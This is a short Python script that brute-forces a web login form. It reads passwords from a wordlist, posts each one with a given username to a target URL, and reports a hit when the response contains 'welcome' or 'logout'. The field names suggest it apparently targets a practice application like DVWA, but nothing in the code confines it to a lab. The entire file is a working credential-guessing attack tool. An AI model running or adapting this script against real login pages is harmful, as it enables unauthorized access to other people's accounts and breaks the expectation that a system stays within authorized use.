import requests
import colorama
from colorama import Fore, Style

colorama.init()

def brute_force(url: str, username: str, wordlist_path: str, session=None) -> dict | None:
    requester = session or requests

    with open(wordlist_path, "r") as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(f"\n[*] Brute forcing {url} with username: {username}")
    print(f"[*] Trying {len(passwords)} passwords....")

    for password in passwords:
        try:
            response = requester.post(url, data={
                "username": username,
                "password": password,
                "Login": "Login"
            }, allow_redirects=True)
            
            body = response.text.lower()

            if "welcome" in body or "logout" in body:
                print(f"{Fore.GREEN}[FOUND]{Style.RESET_ALL} Username: {username} Password: {password}")
                return {"username": username, "password": password}
            else:
                print(f"{Fore.RED}[FAILED]{Style.RESET_ALL} {username} : {password}")
        
        except requests.exceptions.RequestException as e:
            print(f"{Fore.YELLOW}[ERROR]{Style.RESET_ALL} {e}")

    print(f"{Fore.RED}[FAILED]{Style.RESET_ALL} No valid password found for {username}")
    return None